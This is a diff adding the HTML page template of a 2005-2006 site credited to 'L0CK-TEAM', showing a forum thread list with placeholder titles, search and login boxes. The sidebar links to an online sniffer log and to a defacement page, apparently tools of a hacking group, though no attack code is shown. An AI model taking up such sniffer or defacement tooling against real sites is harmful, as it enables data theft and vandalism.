+        <a href="/forum/showthread.php?t=2&goto=newpost" target="_blank"><b class=date>Last message:</b></a>
+        <a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a>
+    </td>
+</tr>
+
+
+<tr>
+    <td class="last_nazv"><a href="/forum/showthread.php?t=2" target="_blank">Second title</a></td>
+    <td class="last_otv"><b class="por">5</b></td>
+    <td class="last_author"><a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a></td>
+    <td class="last_author"><b class="por">1</b></td>
+    <td class="last_obn"><tt class=date>2006-01-28 22:16:08</tt><br>
+        <a href="/forum/showthread.php?t=2&goto=newpost" target="_blank"><b class=date>Last message:</b></a>
+        <a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a>
+    </td>
+</tr>
+
+
+<tr>
+    <td class="last_nazv"><a href="/forum/showthread.php?t=1" target="_blank">First title</a></td>
+    <td class="last_otv"><b class="por">2</b></td>
+    <td class="last_author"><a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a></td>
+    <td class="last_author"><b class="por">35</b></td>
+    <td class="last_obn"><tt class=date>2005-12-05 21:24:13</tt><br>
+        <a href="/forum/showthread.php?t=1&goto=newpost" target="_blank"><b class=date>Last message:</b></a>
+        <a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a>
+    </td>
+</tr>
+
+
+<tr>
+    <td class="last_nazv"><a href="/forum/showthread.php?t=1" target="_blank">First title</a></td>
+    <td class="last_otv"><b class="por">2</b></td>
+    <td class="last_author"><a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a></td>
+    <td class="last_author"><b class="por">35</b></td>
+    <td class="last_obn"><tt class=date>2005-12-05 21:24:06</tt><br>
+        <a href="/forum/showthread.php?t=1&goto=newpost" target="_blank"><b class=date>Last message:</b></a>
+        <a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a>
+    </td>
+</tr>
+
+
+<tr>
+    <td class="last_nazv"><a href="/forum/showthread.php?t=3" target="_blank">werqwerqwerqwer</a></td>
+    <td class="last_otv"><b class="por">0</b></td>
+    <td class="last_author"><a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a></td>
+    <td class="last_author"><b class="por">5</b></td>
+    <td class="last_obn"><tt class=date>2005-12-05 21:13:27</tt><br>
+        <a href="/forum/showthread.php?t=3&goto=newpost" target="_blank"><b class=date>Last message:</b></a>
+        <a href="/forum/member.php?u=1" target="_blank"><b class=porr>wsr</b></a>
+    </td>
+</tr>
+
+
+
+</table>
+
+                    </TD>
+                </TR>
+                </TABLE>
+            </td>
+
+            <td valign="top" align="right">
+
+                <table cellspacing="1" cellPadding="0" width="150" bgColor="#999999" border="0">
+                <TR>
+                    <TD background="/style/templates/lock-team/images/001.gif" bgColor="#fcfcfc" height="16"><CENTER><b class=label>.:.[ Search ].:.</b></CENTER></TD>
+                </TR>
+                <TR>
+                    <TD bgColor="#fcfcfc" width=150>
+
+                        
+                          <TABLE cellSpacing="2" cellPadding="2" width="150" border="0">
+                          <form action="/search.html" method="POST">
+                          <TR>
+                              <TD width=150 align="center">
+                                  <input type="TEXT" class="button" name="search_string" value="search" onmouseover="this.focus ( );" onblur="if ( value == '' ){value = 'search' }" onfocus="if ( value == 'search' ) { value ='' }"><br><br>
+                                  <input type="SUBMIT" class="button" value="Поиск">
+                              </TD>
+                          </TR>
+                          </form>
+                          </TABLE>
+               
+
+                    </TD>
+                </TR>
+                </TABLE>
+
+                <br>
+
+                <table cellpadding="0" cellspacing="0" border="0" width="100%">
+                <tr>
+                    <td>
+                        <table cellspacing="1" cellPadding="2" width="150" bgColor="#999999" border="0">
+                        <TR>
+                            <TD background="/style/templates/lock-team/images/001.gif" bgColor="#fcfcfc" height="16"><CENTER><b class=label>.:.[ Login ].:.</b></CENTER></TD>
+                        </TR>
+                        <TR>
+                            <TD bgColor="#fcfcfc">
+                                <TABLE cellSpacing="2" cellPadding="0" width="100%" border="0">
+                                <TR>
+                                    <TD>
+                                        <center class="porr">Добро пожаловать </center>
+<center class="por">wsr</center>
+<br><center><a href="/adminka/index.php" target="_blank">..::[ Админка ]::..</a></center>
+<center><a href="/local_logs.html">.:.[ Логи сайта ].:.</a></center>
+<br><center><a href="/logout.html"><b class=porr>.:. Выход .:.</b></a></center>
+                                    </TD>
+                                </TR>
+                                </TABLE>
+                            </TD>
+                        </TR>
+                        </TABLE>
+                    </td>
+                </tr>
+                </table>
+                
+                <br>
+                
+                <table cellpadding="0" cellspacing="0" border="0" width="100%">
+                <tr>
+                    <td>
+                        <table cellspacing="1" cellPadding="0" width="150" bgColor="#999999" border="0">
+                        <TR>
+                            <TD background="/style/templates/lock-team/images/001.gif" bgColor="#fcfcfc" height="16"><CENTER><b class=label>.:.[ Sniffer ].:.</b></CENTER></TD>
+                        </TR>
+                        <TR>
+                            <TD bgColor="#fcfcfc">
+                                <TABLE cellSpacing="2" cellPadding="2" width="100%" border="0">
+                                <TR>
+                                    <TD>
+                                        <center><b class=date>Last sites in sniffer-logs : </b></center>
+                                        
+                                    </TD>
+                                </TR>
+                                </TABLE>
+                            </TD>
+                        </TR>
+                        <tr>
+                            <td bgColor="#fcfcfc" align="center">
+                                <a href="/sniffer.html">On-Line Сниффер - <b class=porr>Log</b></a><br>
+                                <a href="/sniffer_info.html">On-Line Сниффер - <b class=porr>Info</b></a><bR>
+                            </td>
+                        </tr>
+                        </TABLE>
+                    </td>
+                </tr>
+                </table>
+                
+                <br>
+
+                <table cellspacing="1" cellPadding="0" width="150" bgColor="#999999" border="0">
+                <TR>
+                    <TD background="/style/templates/lock-team/images/001.gif" bgColor="#fcfcfc" height="16"><CENTER><b class=label>.:.[ Counter ].:.</b></CENTER></TD>
+                </TR>
+                <TR>
+                    <TD bgColor="#fcfcfc" width=150>
+                        <TABLE cellSpacing="2" cellPadding="2" width="150" border="0">
+                        <TR>
+                            <TD width=150>
+                                
+                       <center><img src="/style/templates/lock-team/images/counter.gif" class="fadethis" onMouseOut="imgFade(this,30,10,10)" onMouseOver="imgFade(this,100,30,10)"></center>
+               
+                            </TD>
+                        </TR>
+                        </TABLE>
+                    </TD>
+                </TR>
+                </TABLE>
+                
+                <center><a href="/files/defaced.html" target="_blank"><b class=porr>Дефейсная страница</b></a></center>
+            </td>
+        </tr>
+        </table>
+
+        <TABLE cellSpacing="0" cellPadding="2" background="/style/templates/lock-team/images/2.jpg" width="100%" height="139" border="0">
+        <tr>
+            <td vAlign="top" align="center" colspan="3" height="100%"><Br><a href="#top">Вверх</a><br><b style="FONT-SIZE : 8pt;">.:.[ Copyright © <b class=porr>L0CK-TEAM</b>, 2005-2006 ].:.</b></td>
+        </tr>
+        <tr>
+            <td align="left" style="padding-bottom : 38px; padding-left : 6px;"><b class=porr>Generation time : <b class="por"> 0.37 сек.</b></b></td>
+            <td align="center" style="padding-bottom : 38px;" valign="bottom"></td>
+            <td align="right" style="padding-bottom : 38px; padding-right : 6px;"><b class=porr>Queries to MySQL used : <b class="por"> 13 </b></b></td>
+        </tr>
+        </TABLE>
+    </TD>
+</TR>
+</TABLE>
+
+</BODY>
+</HTML>
